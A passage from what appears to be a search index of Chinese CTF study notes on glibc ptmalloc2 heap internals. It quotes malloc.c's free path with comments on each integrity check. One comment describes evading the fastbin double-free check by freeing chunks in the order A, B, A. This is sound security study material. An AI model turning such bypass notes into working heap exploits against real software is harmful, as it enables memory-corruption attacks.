(( unsigned long )( size ) >= ( unsigned long )( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( p , nb ); av -> top = remainder ; set_head ( p , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , p , nb ); return chunk2mem ( p ); } \u6355\u6349\u6240\u6709\u9519\u8bef \u00b6 /* catch all failure paths */ __set_errno ( ENOMEM ); return 0 ; \u91ca\u653e\u5185\u5b58\u5757 \u00b6 Free Heap Memory \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 __libc_free \u00b6 \u7c7b\u4f3c\u4e8e malloc\uff0cfree \u51fd\u6570\u4e5f\u6709\u4e00\u5c42\u5c01\u88c5\uff0c\u547d\u540d\u683c\u5f0f\u4e0e malloc \u57fa\u672c\u7c7b\u4f3c\u3002\u4ee3\u7801\u5982\u4e0b void __libc_free ( void * mem ) { mstate ar_ptr ; mchunkptr p ; /* chunk corresponding to mem */ // \u5224\u65ad\u662f\u5426\u6709\u94a9\u5b50\u51fd\u6570 __free_hook void ( * hook )( void * , const void * ) = atomic_forced_read ( __free_hook ); if ( __builtin_expect ( hook != NULL , 0 )) { //\u6267\u884chook\u51fd\u6570\u7136\u540e\u8fd4\u56de ( * hook )( mem , RETURN_ADDRESS ( 0 )); return ; } // free NULL\u6ca1\u6709\u4f5c\u7528 if ( mem == 0 ) /* free(0) has no effect */ return ; // \u5c06mem\u8f6c\u6362\u4e3achunk\u72b6\u6001 p = mem2chunk ( mem ); // \u5982\u679c\u8be5\u5757\u5185\u5b58\u662fmmap\u5f97\u5230\u7684 if ( chunk_is_mmapped ( p )) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if ( ! mp_ . no_dyn_threshold && chunksize_nomask ( p ) > mp_ . mmap_threshold && chunksize_nomask ( p ) <= DEFAULT_MMAP_THRESHOLD_MAX && ! DUMPED_MAIN_ARENA_CHUNK ( p )) { mp_ . mmap_threshold = chunksize ( p ); mp_ . trim_threshold = 2 * mp_ . mmap_threshold ; LIBC_PROBE ( memory_mallopt_free_dyn_thresholds , 2 , mp_ . mmap_threshold , mp_ . trim_threshold ); } munmap_chunk ( p ); return ; } // \u6839\u636echunk\u83b7\u5f97\u5206\u914d\u533a\u7684\u6307\u9488 ar_ptr = arena_for_chunk ( p ); // \u6267\u884c\u91ca\u653e _int_free ( ar_ptr , p , 0 ); } _int_free \u00b6 \u51fd\u6570\u521d\u59cb\u65f6\u523b\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u53d8\u91cf\uff0c\u5e76\u4e14\u5f97\u5230\u4e86\u7528\u6237\u60f3\u8981\u91ca\u653e\u7684 chunk \u7684\u5927\u5c0f static void _int_free ( mstate av , mchunkptr p , int have_lock ) { INTERNAL_SIZE_T size ; /* its size */ mfastbinptr * fb ; /* associated fastbin */ mchunkptr nextchunk ; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize ; /* its size */ int nextinuse ; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize ; /* size of previous contiguous chunk */ mchunkptr bck ; /* misc temp for linking */ mchunkptr fwd ; /* misc temp for linking */ const char * errstr = NULL ; int locked = 0 ; size = chunksize ( p ); \u7b80\u5355\u7684\u68c0\u67e5 \u00b6 /* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by \"design\" from some intruder. */ // \u6307\u9488\u4e0d\u80fd\u6307\u5411\u975e\u6cd5\u7684\u5730\u5740, \u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e-size\uff0c\u4e3a\u4ec0\u4e48\uff1f\uff1f\uff1f // \u6307\u9488\u5fc5\u987b\u5f97\u5bf9\u9f50\uff0c2*SIZE_SZ \u8fd9\u4e2a\u5bf9\u9f50\u5f97\u4ed4\u7ec6\u60f3\u60f3 if ( __builtin_expect (( uintptr_t ) p > ( uintptr_t ) - size , 0 ) || __builtin_expect ( misaligned_chunk ( p ), 0 )) { errstr = \"free(): invalid pointer\" ; errout : if ( ! have_lock && locked ) __libc_lock_unlock ( av -> mutex ); malloc_printerr ( check_action , errstr , chunk2mem ( p ), av ); return ; } /* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ // \u5927\u5c0f\u6ca1\u6709\u6700\u5c0f\u7684chunk\u5927\uff0c\u6216\u8005\u8bf4\uff0c\u5927\u5c0f\u4e0d\u662fMALLOC_ALIGNMENT\u7684\u6574\u6570\u500d if ( __glibc_unlikely ( size < MINSIZE || ! aligned_OK ( size ))) { errstr = \"free(): invalid size\" ; goto errout ; } // \u68c0\u67e5\u8be5chunk\u662f\u5426\u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_inuse_chunk ( av , p ); \u5176\u4e2d /* Check if m has acceptable alignment */ #define aligned_OK(m) (((unsigned long) (m) &MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK) fast bin \u00b6 \u5982\u679c\u4e0a\u8ff0\u68c0\u67e5\u90fd\u5408\u683c\u7684\u8bdd\uff0c\u5224\u65ad\u5f53\u524d\u7684 bin \u662f\u4e0d\u662f\u5728 fast bin \u8303\u56f4\u5185\uff0c\u5728\u7684\u8bdd\u5c31\u63d2\u5165\u5230 fastbin \u5934\u90e8 \uff0c\u5373\u6210\u4e3a\u5bf9\u5e94 fastbin \u94fe\u8868\u7684**\u7b2c\u4e00\u4e2a free chunk**\u3002 /* If eligible, place chunk on a fastbin so it can be found and used quickly in malloc. */ if (( unsigned long ) ( size ) <= ( unsigned long ) ( get_max_fast ()) #if TRIM_FASTBINS /* If TRIM_FASTBINS set, don't place chunks bordering top into fastbins */ //\u9ed8\u8ba4 #define TRIM_FASTBINS 0\uff0c\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e0b\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c // \u5982\u679c\u5f53\u524dchunk\u662ffast chunk\uff0c\u5e76\u4e14\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u5219\u4e0d\u80fd\u63d2\u5165 // \u56e0\u4e3a\u4e0b\u4e00\u4e2achunk\u662ftopchunk \u76f4\u63a5\u4e0e topchunk \u5408\u5e76 && ( chunk_at_offset ( p , size ) != av -> top ) #endif ) { // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5c0f\u4e8e\u4e24\u500d\u7684SIZE_SZ,\u5e76\u4e14 // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u4e0d\u80fd\u5927\u4e8esystem_mem\uff0c \u4e00\u822c\u4e3a132k // \u5982\u679c\u51fa\u73b0\u8fd9\u6837\u7684\u60c5\u51b5\uff0c\u5c31\u62a5\u9519\u3002 if ( __builtin_expect ( chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem , 0 )) { /* We might not have a lock at this point and concurrent modifications of system_mem might have let to a false positive. Redo the test after getting the lock. */ if ( have_lock || ({ assert ( locked == 0 ); __libc_lock_lock ( av -> mutex ); locked = 1 ; chunksize_nomask ( chunk_at_offset ( p , size )) <= 2 * SIZE_SZ || chunksize ( chunk_at_offset ( p , size )) >= av -> system_mem ; })) { errstr = \"free(): invalid next size (fast)\" ; goto errout ; } if ( ! have_lock ) { __libc_lock_unlock ( av -> mutex ); locked = 0 ; } } // \u5c06chunk\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ ); // \u8bbe\u7f6efast chunk\u7684\u6807\u8bb0\u4f4d set_fastchunks ( av ); // \u6839\u636e\u5927\u5c0f\u83b7\u53d6fast bin\u7684\u7d22\u5f15 unsigned int idx = fastbin_index ( size ); // \u83b7\u53d6\u5bf9\u5e94fastbin\u7684\u5934\u6307\u9488\uff0c\u88ab\u521d\u59cb\u5316\u540e\u4e3aNULL\u3002 fb = & fastbin ( av , idx ); /* Atomically link P to its fastbin: P->FD = *FB; *FB = P; */ // \u4f7f\u7528\u539f\u5b50\u64cd\u4f5c\u5c06P\u63d2\u5165\u5230\u94fe\u8868\u4e2d mchunkptr old = * fb , old2 ; unsigned int old_idx = ~ 0u ; do { /* Check that the top of the bin is not the record we are going to add (i.e., double free). */ // so we can not double free one fastbin chunk // \u9632\u6b62\u5bf9 fast bin double free // \u9632\u5fa1\u65b9\u6cd5\u662f\u901a\u8fc7\u68c0\u67e5\u4e0a\u4e00\u4e2achunk\u662f\u5426\u548c\u65b0\u91ca\u653e\u7684chunk\u5730\u5740\u76f8\u540c // \u7ed5\u8fc7\u65b9\u6cd5\u5c31\u662f\u5728\u4e2d\u95f4\u5939\u6742\u4e00\u4e2a\u5176\u4ed6chunk\uff0c\u6bd4\u5982\u9700\u8981doublefree A\uff0c\u91ca\u653e\u987a\u5e8f\u4e3a\uff1a // free A\u3001free B\u3001free A if ( __builtin_expect ( old == p , 0 )) { errstr = \"double free or corruption (fasttop)\" ; goto errout ; } /* Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding. We can dereference OLD only if we have the lock, otherwise it might have already been deallocated. See use of OLD_IDX below for the actual check. */ if ( have_lock && old != NULL ) old_idx = fastbin_index ( chunksize ( old )); p -> fd = old2 = old ; } while (( old = catomic_compare_and_exchange_val_rel ( fb , p , old2 )) != old2 ); // \u786e\u4fddfast bin\u7684\u52a0\u5165\u524d\u4e0e\u52a0\u5165\u540e\u76f8\u540c if ( have_lock && old != NULL && __builtin_expect ( old_idx != idx , 0 )) { errstr = \"invalid fastbin entry (free)\" ; goto errout ; } } \u5408\u5e76\u975e mmap \u7684\u7a7a\u95f2 chunk \u00b6 \u53ea\u6709\u4e0d\u662f fast bin \u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u89e6\u53d1 unlink \u9996\u5148\u6211\u4eec\u5148\u8bf4\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u5408\u5e76 chunk\uff0c\u8fd9\u662f\u4e3a\u4e86\u907f\u514d heap \u4e2d\u6709\u592a\u591a\u96f6\u96f6\u788e\u788e\u7684\u5185\u5b58\u5757\uff0c\u5408\u5e76\u4e4b\u540e\u53ef\u4ee5\u7528\u6765\u5e94\u5bf9\u66f4\u5927\u7684\u5185\u5b58\u5757\u8bf7\u6c42\u3002\u5408\u5e76\u7684\u4e3b\u8981\u987a\u5e8f\u4e3a \u5148\u8003\u8651\u7269\u7406\u4f4e\u5730\u5740\u7a7a\u95f2\u5757 \u540e\u8003\u8651\u7269\u7406\u9ad8\u5730\u5740\u7a7a\u95f2\u5757 \u5408\u5e76\u540e\u7684 chunk \u6307\u5411\u5408\u5e76\u7684 chunk \u7684\u4f4e\u5730\u5740\u3002 \u5728\u6ca1\u6709\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u5148\u83b7\u5f97\u9501\u3002 /* Consolidate other non-mmapped chunks as they arrive. */ else if ( ! chunk_is_mmapped ( p )) { if ( ! have_lock ) { __libc_lock_lock ( av -> mutex ); locked = 1 ; } nextchunk = chunk_at_offset ( p , size ); \u8f7b\u91cf\u7ea7\u7684\u68c0\u6d4b \u00b6 /* Lightweight tests: check whether the block is already the top block. */ // \u5f53\u524dfree\u7684chunk\u4e0d\u80fd\u662ftop chunk if ( __glibc_unlikely ( p == av -> top )) { errstr = \"double free or corruption (top)\" ; goto errout ; } // \u5f53\u524dfree\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u4e0d\u80fd\u8d85\u8fc7arena\u7684\u8fb9\u754c /* Or whether the next chunk is beyond the boundaries of the arena. */ if ( __builtin_expect ( contiguous ( av ) && ( char * ) nextchunk >= (( char * ) av -> top + chunksize ( av -> top )), 0 )) { errstr = \"double free or corruption (out)\" ; goto errout ; } // \u5f53\u524d\u8981free\u7684chunk\u7684\u4f7f\u7528\u6807\u8bb0\u6ca1\u6709\u88ab\u6807\u8bb0\uff0cdouble free /* Or whether the block is actually not marked used. */ if ( __glibc_unlikely ( ! prev_inuse ( nextchunk ))) { errstr = \"double free or corruption (!prev)\" ; goto errout ; } // \u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f nextsize = chunksize ( nextchunk ); // next chunk size valid check // \u5224\u65ad\u4e0b\u4e00\u4e2achunk\u7684\u5927\u5c0f\u662f\u5426\u4e0d\u5927\u4e8e2*SIZE_SZ\uff0c\u6216\u8005 // nextsize\u662f\u5426\u5927\u4e8e\u7cfb\u7edf\u53ef\u63d0\u4f9b\u7684\u5185\u5b58 if ( __builtin_expect ( chunksize_nomask ( nextchunk ) <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( nextsize >= av -> system_mem , 0 )) { errstr = \"free(): invalid next size (normal)\" ; goto errout ; } \u91ca\u653e\u586b\u5145 \u00b6 //\u5c06\u6307\u9488\u7684mem\u90e8\u5206\u5168\u90e8\u8bbe\u7f6e\u4e3aperturb_byte free_perturb ( chunk2mem ( p ), size - 2 * SIZE_SZ ); \u540e\u5411\u5408\u5e76 - \u5408\u5e76\u4f4e\u5730\u5740 chunk \u00b6 /* consolidate backward */ if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( av , p , bck , fwd ); } \u4e0b\u4e00\u5757\u4e0d\u662f top chunk - \u524d\u5411\u5408\u5e76 - \u5408\u5e76\u9ad8\u5730\u5740 chunk \u00b6 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u4e0b\u4e00\u5757\u4e0d\u662f top chunk \uff0c\u5219\u5408\u5e76\u9ad8\u5730\u5740\u7684 chunk \uff0c\u5e76\u5c06\u5408\u5e76\u540e\u7684 chunk \u653e\u5165\u5230 unsorted bin \u4e2d\u3002 // \u5982\u679c\u4e0b\u4e00\u4e2achunk\u4e0d\u662ftop chunk if ( nextchunk != av -> top ) { /* get and clear inuse bit */ // \u83b7\u53d6\u4e0b\u4e00\u4e2a chunk \u7684\u4f7f\u7528\u72b6\u6001 nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); // \u5982\u679c\u4e0d\u5728\u4f7f\u7528\uff0c\u5408\u5e76\uff0c\u5426\u5219\u6e05\u7a7a\u5f53\u524dchunk\u7684\u4f7f\u7528\u72b6\u6001\u3002 /* consolidate forward */ if ( ! nextinuse ) { unlink ( av , nextchunk , bck , fwd ); size += nextsize ; } else clear_inuse_bit_at_offset ( nextchunk , 0 ); /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ // \u628a chunk \u653e\u5728 unsorted chunk \u94fe\u8868\u7684\u5934\u90e8 // unsorted bin \u94fe\u5934 bck = unsorted_chunks ( av ); // unsorted bin \u987a\u6570\u7b2c\u4e00\u4e2a\uff08\u6700\u65b0\u653e\u5165\uff09 fwd = bck -> fd ; // \u7b80\u5355\u7684\u68c0\u67e5 if ( __glibc_unlikely ( fwd -> bk != bck )) { errstr = \"free(): corrupted unsorted chunks\" ; goto errout ; } p -> fd = fwd ; p -> bk = bck ; // \u5982\u679c\u662f large chunk\uff0c\u90a3\u5c31\u8bbe\u7f6enextsize\u6307\u9488\u5b57\u6bb5\u4e3aNULL\u3002 if ( ! in_smallbin_range ( size )) { p -> fd_nextsize = NULL ; p -> bk_nextsize = NULL ; } bck -> fd = p ; fwd -> bk = p ; set_head ( p , size | PREV_INUSE ); set_foot ( p , size ); check_free_chunk ( av , p ); } \u4e0b\u4e00\u5757\u662f top chunk - \u5408\u5e76\u5230 top chunk \u00b6 /* If the chunk borders the current high end of memory, consolidate into top */ // \u5982\u679c\u8981\u91ca\u653e\u7684chunk\u7684\u4e0b\u4e00\u4e2achunk\u662ftop chunk\uff0c\u90a3\u5c31\u5408\u5e76\u5230 top chunk else { size += nextsize ; set_head ( p , size | PREV_INUSE ); av -> top = p ; check_chunk ( av , p ); } \u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 \u00b6 /* If freeing a large space, consolidate possibly-surrounding chunks. Then, if the total unused topmost memory exceeds trim threshold, ask malloc_trim to reduce top. Unless max_fast is 0, we don't know if there are fastbins bordering top, so we cannot tell for sure whether threshold has been reached unless fastbins are consolidated. But we don't want to consolidate on each free. As a compromise, consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD is reached. */ // \u5982\u679c\u5408\u5e76\u540e\u7684 chunk \u7684\u5927\u5c0f\u5927\u4e8eFASTBIN_CONSOLIDATION_THRESHOLD // \u4e00\u822c\u5408\u5e76\u5230 top chunk \u90fd\u4f1a\u6267\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u3002 // \u90a3\u5c31\u5411\u7cfb\u7edf\u8fd4\u8fd8\u5185\u5b58 if (( unsigned long ) ( size ) >= FASTBIN_CONSOLIDATION_THRESHOLD ) { // \u5982\u679c\u6709 fast chunk \u5c31\u8fdb\u884c\u5408\u5e76 if ( have_fastchunks ( av )) malloc_consolidate ( av ); // \u4e3b\u5206\u914d\u533a if ( av == & main_arena ) { #ifndef MORECORE_CANNOT_TRIM // top chunk \u5927\u4e8e\u5f53\u524d\u7684\u6536\u7f29\u9619\u503c if (( unsigned long ) ( chunksize ( av -> top )) >= ( unsigned long ) ( mp_ . trim_threshold )) systrim ( mp_ . top_pad , av ); #endif // \u975e\u4e3b\u5206\u914d\u533a\uff0c\u5219\u76f4\u63a5\u6536\u7f29heap } else { /* Always try heap_trim(), even if the top chunk is not large, because the corresponding heap might go away. */ heap_info * heap = heap_for_ptr ( top ( av )); assert ( heap -> ar_ptr == av ); heap_trim ( heap , mp_ . top_pad ); } } if ( ! have_lock ) { assert ( locked ); __libc_lock_unlock ( av -> mutex ); } \u91ca\u653e mmap \u7684 chunk \u00b6 } else { // If the chunk was allocated via mmap, release via munmap(). munmap_chunk ( p ); } systrim \u00b6 heap_trim \u00b6 munmap_chunk \u00b6 \u8fd9\u91cc\u610f\u601d\u662f\u53bb\u5bf9\u5e94 bin \u53d6\uff0c\u6ca1\u6709\u529e\u6cd5\u53d6\u5230\u3002\u6bd4\u5982\u9700\u8981\u4e00\u4e2a 0x100 \u7684chunk \uff0c\u53bb\u5230\u5927\u5c0f\u4e3a 0x100 \u7684bin \u4e2d\u53d6\uff0c\u800c\u8be5 bin \u4e2d\u6ca1\u6709\u7a7a\u95f2 chunk \u3002 \u21a9 \u21a9 \u21a9 \u5b9e\u9645\u4e0a\u8fd8\u9700\u8fdb\u884c\u5bf9\u9f50\u7b49\u64cd\u4f5c\uff0c\u8fd4\u56de\u5185\u5b58\u5757\u4e0d\u4e00\u5b9a\u662f\u5bf9\u5e94\u5927\u5c0f\u7684 \u21a9 \u8fd8\u9700\u8981\u6839\u636e\u5185\u5b58\u5757\u7684\u7269\u7406\u4f4d\u7f6e\u5224\u65ad\u662f\u5426\u8fd8\u7ed9\u7cfb\u7edf \u21a9 \u4e5f\u5c31\u662f\u76f8\u5f53\u4e8e malloc \u662f\u4e00\u4e2a\u6574\u5408\u5305\uff0c\u6253\u5305\u597d\u5b9e\u73b0\u7533\u8bf7\u5806\u5757\u9700\u8981\u7528\u5230\u7684\u6240\u6709\u51fd\u6570\u3002\u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709 system \u7b49 \u21a9","title":"\u5806\u57fa\u7840\u77e5\u8bc6"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_1","text":"\u5185\u5bb9\u7edd\u5927\u90e8\u5206\u6765\u81eactf-wiki\uff0c\u6587\u7ae0\u7528\u4e8e\u81ea\u5df1\u5b66\u4e60\u8bb0\u5f55","title":"\u5806\u6982\u8ff0"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_2","text":"\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c \u5806\u53ef\u4ee5\u63d0\u4f9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58 \uff0c\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u5927\u5c0f\u672a\u77e5\u7684\u5185\u5b58 1 \u3002\u5806\u5176\u5b9e\u5c31\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u5757\u8fde\u7eed\u7684\u7ebf\u6027\u533a\u57df\uff0c\u5b83\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u65b9\u5411\u589e\u957f\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7ba1\u7406\u5806\u7684\u90a3\u90e8\u5206\u7a0b\u5e8f\u4e3a\u5806\u7ba1\u7406\u5668\u3002 \u5806\u7ba1\u7406\u5668\u5904\u4e8e\u7528\u6237\u7a0b\u5e8f\u4e0e\u5185\u6838\u4e2d\u95f4\uff0c\u4e3b\u8981\u505a\u4ee5\u4e0b\u5de5\u4f5c \u54cd\u5e94\u7528\u6237\u7684\u7533\u8bf7\u5185\u5b58\u8bf7\u6c42\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf**\u7533\u8bf7\u5185\u5b58**\uff0c\u7136\u540e\u5c06\u5176\u8fd4\u56de\u7ed9\u7528\u6237\u7a0b\u5e8f\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u4fdd\u6301\u5185\u5b58\u7ba1\u7406\u7684\u9ad8\u6548\u6027\uff0c \u5185\u6838\u4e00\u822c\u90fd\u4f1a\u9884\u5148\u5206\u914d\u5f88\u5927\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u7136\u540e\u8ba9\u5806\u7ba1\u7406\u5668\u901a\u8fc7\u67d0\u79cd\u7b97\u6cd5\u7ba1\u7406\u8fd9\u5757\u5185\u5b58\u3002\u53ea\u6709\u5f53\u51fa\u73b0\u4e86\u5806\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\uff0c\u5806\u7ba1\u7406\u5668\u624d\u4f1a\u518d\u6b21\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92 \u3002 \u7ba1\u7406\u7528\u6237\u6240\u91ca\u653e\u7684\u5185\u5b58 \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u7528\u6237\u91ca\u653e\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u800c\u662f\u7531\u5806\u7ba1\u7406\u5668\u8fdb\u884c\u7ba1\u7406\u3002\u8fd9\u4e9b\u91ca\u653e\u7684\u5185\u5b58\u53ef\u4ee5\u6765\u54cd\u5e94\u7528\u6237\u65b0\u7533\u8bf7\u7684\u5185\u5b58\u7684\u8bf7\u6c42\u3002 Linux \u4e2d\u65e9\u671f\u7684\u5806\u5206\u914d\u4e0e\u56de\u6536\u7531 Doug Lea \u5b9e\u73b0\uff0c\u4f46\u5b83\u5728\u5e76\u884c\u5904\u7406\u591a\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u5171\u4eab\u8fdb\u7a0b\u7684\u5806\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u4f7f\u7528\u5806\u65f6\uff0c\u4f1a\u8fdb\u884c\u52a0\u9501\u3002\u7136\u800c\uff0c\u4e0e\u6b64\u540c\u65f6\uff0c\u52a0\u9501\u4f1a\u5bfc\u81f4\u5176\u5b83\u7ebf\u7a0b\u65e0\u6cd5\u4f7f\u7528\u5806\uff0c\u964d\u4f4e\u4e86\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u9ad8\u6548\u6027\u3002\u540c\u65f6\uff0c\u5982\u679c\u5728\u591a\u7ebf\u7a0b\u4f7f\u7528\u65f6\uff0c\u6ca1\u80fd\u6b63\u786e\u63a7\u5236\uff0c\u4e5f\u53ef\u80fd\u5f71\u54cd\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u6b63\u786e\u6027\u3002Wolfram Gloger \u5728 Doug Lea \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6539\u8fdb\u4f7f\u5176\u53ef\u4ee5\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u5806\u5206\u914d\u5668\u5c31\u662f ptmalloc \u3002\u5728 glibc-2.3.x. \u4e4b\u540e\uff0cglibc \u4e2d\u96c6\u6210\u4e86 ptmalloc2\u3002 \u76ee\u524d Linux \u6807\u51c6\u53d1\u884c\u7248\u4e2d\u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u662f glibc \u4e2d\u7684\u5806\u5206\u914d\u5668\uff1aptmalloc2\u3002ptmalloc2 \u4e3b\u8981\u662f\u901a\u8fc7 malloc/free \u51fd\u6570\u6765\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u5757\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5185\u5b58\u5206\u914d\u4e0e\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cLinux \u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u57fa\u672c\u5185\u5b58\u7ba1\u7406\u601d\u60f3\uff0c \u53ea\u6709\u5f53\u771f\u6b63\u8bbf\u95ee\u4e00\u4e2a\u5730\u5740\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5efa\u7acb\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u9762\u7684\u6620\u5c04\u5173\u7cfb \u3002 \u6240\u4ee5\u867d\u7136\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u7a0b\u5e8f\u5206\u914d\u4e86\u5f88\u5927\u7684\u4e00\u5757\u5185\u5b58\uff0c\u4f46\u662f\u8fd9\u5757\u5185\u5b58\u5176\u5b9e\u53ea\u662f\u865a\u62df\u5185\u5b58\u3002\u53ea\u6709\u5f53\u7528\u6237\u4f7f\u7528\u5230\u76f8\u5e94\u7684\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u624d\u4f1a\u771f\u6b63\u5206\u914d\u7269\u7406\u9875\u9762\u7ed9\u7528\u6237\u4f7f\u7528\u3002","title":"\u4ec0\u4e48\u662f\u5806"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_3","text":"\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd \u57fa\u672c\u7684\u5806\u64cd\u4f5c\uff0c\u5305\u62ec\u5806\u7684\u5206\u914d\uff0c\u56de\u6536\uff0c\u5806\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528 \u4ecb\u7ecd\u5806\u76ee\u524d\u7684\u591a\u7ebf\u7a0b\u652f\u6301\u3002","title":"\u5806\u7684\u57fa\u672c\u64cd\u4f5c"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#malloc","text":"\u5728 glibc \u7684 malloc.c \u4e2d\uff0cmalloc \u7684\u8bf4\u660e\u5982\u4e0b /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ \u53ef\u4ee5\u770b\u51fa\uff0cmalloc \u51fd\u6570\u8fd4\u56de\u5bf9\u5e94\u5927\u5c0f\u5b57\u8282\u7684\u5185\u5b58\u5757\u7684**\u6307\u9488** 2 \u3002\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u8fd8\u5bf9\u4e00\u4e9b\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 n=0 \u65f6\uff0c\u8fd4\u56de\u5f53\u524d\u7cfb\u7edf\u5141\u8bb8\u7684\u5806\u7684\u6700\u5c0f\u5185\u5b58\u5757\u3002 \u5f53 n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7531\u4e8e\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\uff0c size_t \u662f \u65e0\u7b26\u53f7\u6570 \uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff09 